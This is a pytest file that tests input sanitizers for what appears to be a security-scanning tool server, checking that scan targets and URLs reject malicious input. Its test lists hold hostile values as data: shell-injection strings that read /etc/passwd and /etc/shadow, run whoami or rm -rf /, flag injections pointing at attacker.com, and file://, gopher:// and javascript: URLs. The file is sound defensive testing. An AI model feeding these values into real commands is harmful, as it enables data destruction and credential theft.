import pytest
from security_mcp.sanitizer import sanitize_target, sanitize_url


class TestSanitizeTarget:
    @pytest.mark.parametrize(
        "target",
        [
            "example.com",
            "scanme.nmap.org",
            "sub.domain.example.co.uk",
            "test-site.org",
            "my-server123.net",
            "127.0.0.1",
            "45.33.32.156",
            "8.8.8.8",
            "255.255.255.255",
        ],
    )
    def test_valid_targets(self, target: str):
        assert sanitize_target(target) == target

    def test_empty_target(self):
        with pytest.raises(ValueError, match="Target cannot be empty"):
            sanitize_target("")
        with pytest.raises(ValueError, match="Target cannot be empty"):
            sanitize_target("   ")

    @pytest.mark.parametrize(
        "malicious_target",
        [
            "-o /tmp/malicious.txt",
            "-v",
            "--config=http://attacker.com",
            "--version",
        ],
    )
    def test_flag_injection_blocked(self, malicious_target: str):
        with pytest.raises(ValueError, match="Flag injection attempt detected"):
            sanitize_target(malicious_target)

    @pytest.mark.parametrize(
        "injection_target",
        [
            "example.com; cat /etc/passwd",
            "127.0.0.1 | ls",
            "$(whoami).evil.com",
            "`whoami`.evil.com",
            "example.com && rm -rf /",
            "example.com > /tmp/out",
            "example.com\ncat /etc/shadow",
            "127.0.0.1; whoami",
        ],
    )
    def test_command_injection_blocked(self, injection_target: str):
        with pytest.raises(ValueError, match="Invalid domain or IP format"):
            sanitize_target(injection_target)

    @pytest.mark.parametrize(
        "invalid_target",
        [
            "invalid..domain",
            "http://example.com",
            "999.999.999.999",
            "example..com",
            "domain with spaces.com",
            ".example.com",
            "example.com.",
        ],
    )
    def test_malformed_targets_blocked(self, invalid_target: str):
        with pytest.raises(ValueError, match="Invalid domain or IP format"):
            sanitize_target(invalid_target)


class TestSanitizeUrl:
    @pytest.mark.parametrize(
        "url",
        [
            "http://example.com",
            "https://example.com",
            "https://scanme.nmap.org",
            "http://127.0.0.1:8080",
            "https://sub.domain.org/path/resource?key=value#section",
        ],
    )
    def test_valid_urls(self, url: str):
        assert sanitize_url(url) == url

    @pytest.mark.parametrize(
        "flag_url",
        [
            "-v http://example.com",
            "-o /tmp/evil",
            "--insecure",
        ],
    )
    def test_flag_injection_in_url_blocked(self, flag_url: str):
        with pytest.raises(ValueError, match="Flag injection attempt detected"):
            sanitize_url(flag_url)

    @pytest.mark.parametrize(
        "unsupported_url",
        [
            "ftp://example.com",
            "file:///etc/passwd",
            "gopher://evil.com",
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=",
        ],
    )
    def test_unsupported_scheme_blocked(self, unsupported_url: str):
        with pytest.raises(ValueError, match="Unsupported protocol scheme"):
            sanitize_url(unsupported_url)

    def test_missing_hostname_blocked(self):
        with pytest.raises(ValueError, match="Invalid URL structure"):
            sanitize_url("http://")

    def test_flag_injection_in_hostname_blocked(self):
        with pytest.raises(ValueError, match="Flag injection attempt detected in hostname"):
            sanitize_url("http://-badhost.com")
